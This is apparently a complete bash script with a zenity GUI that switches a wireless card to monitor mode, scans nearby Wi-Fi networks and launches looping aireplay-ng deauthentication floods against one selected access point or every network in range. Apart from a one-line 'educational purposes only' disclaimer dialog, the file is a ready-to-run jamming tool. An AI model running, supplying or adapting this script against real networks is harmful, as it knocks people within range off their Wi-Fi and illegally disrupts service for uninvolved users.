#!/bin/bash
# by rff-glitch (raef) 

if [[ $EUID -ne 0 ]]; then 
    zenity --error --title="Root Required" --text="Root access is required. Please run this script as root." --width=300
    exit 1
fi

(
echo "# Checking dependencies..."
apt-get install -y zenity aircrack-ng xterm macchanger > /dev/null 2>&1
) | zenity --progress --title="Dependencies" --pulsate --auto-close

for cmd in airmon-ng airodump-ng aireplay-ng xterm iwconfig; do
    if ! command -v "$cmd" &>/dev/null; then 
        zenity --error --title="Missing Tool" --text="Required tool not found: $cmd" --width=300
        exit 1
    fi
done

iface=""
scan_file=""
csv_file=""
declare -a interfaces
declare -a aps
attack_pids=()

zenity --question --title="Disclaimer" \
    --text="This tool is for educational purposes only.\nUnauthorized network interference is illegal.\n\nDo you agree to use this responsibly?" \
    --width=400 --height=200 --ok-label="Agree" --cancel-label="Exit"
[[ $? -ne 0 ]] && exit 0

scan_networks() {
    scan_file="/tmp/scan_$(date +%s)"
    
    xterm -hold -T "WiFi Scanner" -geometry 100x30 -e "airodump-ng -w $scan_file --output-format csv $iface" &
    scan_pid=$!
    
    (
    for i in {1..15}; do  
        echo $((i*6))
        echo "# Scanning networks... (${i}/15 seconds)"
        sleep 1
    done
    kill $scan_pid 2>/dev/null
    wait $scan_pid 2>/dev/null
    echo "100"
    ) | zenity --progress --title="Network Scan" --percentage=0 --auto-close
    
    csv_file=$(ls -t ${scan_file}-*.csv 2>/dev/null | head -n 1)
    
    if [[ ! -f "$csv_file" ]]; then 
        zenity --error --title="Scan Failed" --text="No scan results found. Try:\n1. Moving closer to APs\n2. Using different channel\n3. Checking interface support"
        return 1
    fi

    mapfile -t aps < <(grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$csv_file" | awk -F',' '
    {
        bssid = $1; gsub(/ /, "", bssid);
        channel = $4; 
        gsub(/ /, "", channel);
        if (channel == "") channel = "N/A";
        essid = $14; 
        gsub(/^ /, "", essid); 
        gsub(/ $/, "", essid);
        if (essid == "") essid = "Hidden";
        if (bssid != "" && channel != "N/A") {
            print bssid "|" channel "|" essid
        }
    }')

    if [[ ${#aps[@]} -eq 0 ]]; then
        zenity --error --title="No APs Found" --text="No access points detected in:\n$(head -n 5 "$csv_file")"
        return 1
    fi
    
    return 0
}

launch_attack() {
    local mode="$1"
    local selected=()
    
    if [[ "$mode" == "single" ]]; then
        local ap_list=()
        for ap in "${aps[@]}"; do
            IFS='|' read -r bssid channel essid <<< "$ap"
            ap_list+=("$bssid" "$channel" "$essid")
        done
        
        local choices=$(zenity --list --title="Select Target" --text="Choose AP to attack:" \
            --column="BSSID" --column="Channel" --column="ESSID" \
            --print-column=1 --separator="|" "${ap_list[@]}" --height=400 --width=600)
        [[ -z "$choices" ]] && return 1
        selected=("$choices")
    else
        selected=("${aps[@]}")
    fi

    for ap in "${selected[@]}"; do
        IFS='|' read -r bssid channel essid <<< "$ap"
        
        [[ "$channel" != "N/A" ]] && iwconfig "$iface" channel "$channel" > /dev/null 2>&1
        
        if [[ "$mode" == "single" ]]; then
            for i in {1..3}; do
                xterm -bg black -fg red -T "Jamming $essid" \
                    -e "while true; do aireplay-ng --deauth 0 -a $bssid $iface; sleep 3; done" &
                attack_pids+=($!)
                sleep 0.5
            done
        else
            for i in {1..2}; do
                xterm -bg black -fg red -T "Jamming $essid" \
                    -e "while true; do aireplay-ng --deauth 0 -a $bssid $iface; sleep 3; done" &
                attack_pids+=($!)
                sleep 0.5
            done
        fi
    done

    zenity --info --title="Attack Running" \
        --text="Deauth attack running against ${#selected[@]} AP(s)\n\nClick OK to stop" \
        --width=400
    
    stop_attack
}

stop_attack() {
    for pid in "${attack_pids[@]}"; do
        kill -9 "$pid" 2>/dev/null
    done
    attack_pids=()
}

restore_interface() {
    stop_attack
    [[ -n "$iface" ]] && {
        ip link set "$iface" down
        iw dev "$iface" set type managed
        ip link set "$iface" up
        service NetworkManager restart > /dev/null 2>&1
    }
    rm -f /tmp/scan_* 2>/dev/null
}

main() {
    mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
    [[ ${#interfaces[@]} -eq 0 ]] && { zenity --error --title="No Interface" --text="No wireless interfaces found"; exit 1; }
    
    if [[ ${#interfaces[@]} -eq 1 ]]; then
        iface="${interfaces[0]}"
    else
        iface=$(zenity --list --title="Select Interface" --text="Choose wireless interface:" \
            --column="Interface" "${interfaces[@]}" --height=200 --width=300)
        [[ -z "$iface" ]] && exit 0
    fi

    (
    echo "# Configuring interface..."
    airmon-ng check kill > /dev/null 2>&1
    ip link set "$iface" down
    iw dev "$iface" set type monitor
    ip link set "$iface" up
    iw dev "$iface" set power_save off
    echo "100"
    ) | zenity --progress --title="Initializing" --percentage=0 --auto-close

    scan_networks || { restore_interface; exit 1; }

    mode=$(zenity --list --title="Attack Mode" --text="Choose attack strategy:" \
        --column="Mode" --column="Description" \
        "global" "Attack all detected networks" \
        "single" "Attack one specific network" --height=200 --width=400)
    [[ -z "$mode" ]] && { restore_interface; exit 0; }

    launch_attack "$mode"
    
    restore_interface
}

trap 'restore_interface; exit 0' INT TERM EXIT

main
#by (rff-glitch)raef